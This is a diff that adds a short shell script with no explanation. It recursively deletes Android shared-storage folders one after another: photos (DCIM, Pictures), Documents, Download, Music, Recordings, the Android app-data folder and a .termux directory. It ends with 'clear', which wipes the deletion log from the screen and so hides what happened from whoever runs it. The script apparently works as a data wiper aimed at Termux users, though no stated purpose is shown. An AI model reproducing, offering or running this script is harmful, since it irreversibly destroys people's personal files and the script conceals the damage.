@@ -1,0 +1,19 @@
+rm -rfv /storage/emulated/0/.adblocker_1dm
+rm -rfv /storage/emulated/0/.termux
+rm -rfv /storage/emulated/0/.ext4
+rm -rfv /storage/emulated/0/.dev
+rm -rfv /storage/emulated/0/Alarms
+rm -rfv /storage/emulated/0/Android
+rm -rfv /storage/emulated/0/Audiobooks
+rm -rfv /storage/emulated/0/DCIM
+rm -rfv /storage/emulated/0/Documents
+rm -rfv /storage/emulated/0/Download
+rm -rfv /storage/emulated/0/Movies
+rm -rfv /storage/emulated/0/Music
+rm -rfv /storage/emulated/0/Notifications
+rm -rfv /storage/emulated/0/Pictures
+rm -rfv /storage/emulated/0/pm
+rm -rfv /storage/emulated/0/Podcasts
+rm -rfv /storage/emulated/0/Recordings
+rm -rfv /storage/emulated/0/Ringtones
+clear
